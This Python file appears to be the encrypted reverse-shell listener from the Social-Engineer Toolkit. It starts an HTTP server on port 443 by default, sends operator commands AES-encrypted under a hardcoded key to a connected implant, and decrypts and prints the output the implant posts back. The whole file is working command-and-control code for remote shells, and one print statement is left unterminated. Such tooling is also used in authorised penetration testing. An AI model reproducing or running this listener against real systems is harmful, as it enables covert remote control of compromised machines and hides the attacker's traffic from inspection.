from http.server import BaseHTTPRequestHandler
from http.server import HTTPServer
import urllib
import re
import os
import base64
from Crypto.Cipher import AES
import sys
import time
from src.core.setcore import *
BLOCK_SIZE = 32
PADDING = '{'
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
secret = "(3j^%sh@hd3hDH2u3h@*!~h~2&^lk<!L"
cipher = AES.new(secret)
def htc(m):
    return chr(int(m.group(1), 16))
def urldecode(url):
    rex = re.compile('%([0-9a-hA-H][0-9a-hA-H])', re.M)
    return rex.sub(htc, url)
class GetHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        message = input("shell> ")
        if message == "quit" or message == "exit":
            print ("\nExiting the SET RevShell Listener... ")
            time.sleep(2)
            sys.exit()
        self.send_response(200)
        self.end_headers()
        message = EncodeAES(cipher, message)
        message = base64.b64encode(message)
        self.wfile.write(message)
        return
    def do_POST(self):
        self.send_response(200)
        self.end_headers()
        length = int(self.headers.getheader('content-length'))
        qs = self.rfile.read(length)
        url = urldecode(qs)
        url = url.replace("cmd=", "")
        message = base64.b64decode(url)
        message = DecodeAES(cipher, message)
        print(message)
try:
    if check_options("PORT=") != 0:
        port = check_options("PORT=")
    else:
        port = 443
    server = HTTPServer(('', int(port)), GetHandler)
    print("""############################################
    print('Starting encrypted web shell server, use <Ctrl-C> to stop')
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("[!] Exiting the encrypted webserver shell.. hack the gibson.")
except Exception as e:
    print("Something went wrong, printing error: " + e)